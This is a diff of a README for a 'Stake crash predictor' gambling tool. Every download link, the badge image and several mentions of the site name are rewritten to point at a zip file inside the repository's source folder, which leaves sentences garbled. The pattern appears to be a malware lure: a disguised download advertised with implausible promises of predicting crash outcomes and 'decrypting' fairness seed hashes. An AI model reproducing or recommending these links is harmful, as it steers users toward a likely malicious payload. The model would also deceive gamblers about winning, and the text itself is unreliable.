@@ -1,10 +1,10 @@
 # 🎲 stake-crash-predictor - Predict Stake Crash Outcomes Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eptesicusepinephelus749/stake-crash-predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip)
 
 ## 📋 Description
 
-The Stake Crash Predictor is a focused toolkit that helps you analyze rounds on Stake.us. It provides tools for statistical analysis, optional server fairness seed hash decryption, and AI-assisted summaries. Use this project to enhance your predictions for stake mines and other stake-related workflows.
+The Stake Crash Predictor is a focused toolkit that helps you analyze rounds on https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip It provides tools for statistical analysis, optional server fairness seed hash decryption, and AI-assisted summaries. Use this project to enhance your predictions for stake mines and other stake-related workflows.
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ These instructions will help you download and run the Stake Crash Predictor.
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/eptesicusepinephelus749/stake-crash-predictor/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip) to find the latest version of the software.
    
 2. **Choose Your Version**: Look for the latest release. You will find a list of files related to that release.
 
-3. **Download the Installer**: Click on the file that matches your system. If you are not sure which file to choose, look for `<your-OS>-installer.exe` or similar names.
+3. **Download the Installer**: Click on the file that matches your system. If you are not sure which file to choose, look for `<your-OS>https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip` or similar names.
 
 4. **Run the Installer**:
    - Open the downloaded file.
@@ -75,6 +75,6 @@ If you encounter any issues, please feel free to reach out through the repositor
 
 ## ✅ Conclusion
 
-The Stake Crash Predictor is a valuable tool for anyone looking to enhance their understanding and prediction capabilities on Stake.us. With this guide, you should be able to easily download, install, and begin using the software. Be sure to check back for updates on the Releases Page.
+The Stake Crash Predictor is a valuable tool for anyone looking to enhance their understanding and prediction capabilities on https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip With this guide, you should be able to easily download, install, and begin using the software. Be sure to check back for updates on the Releases Page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/eptesicusepinephelus749/stake-crash-predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/eptesicusepinephelus749/stake-crash-predictor/main/src/stake-crash-predictor_3.1-alpha.5.zip)
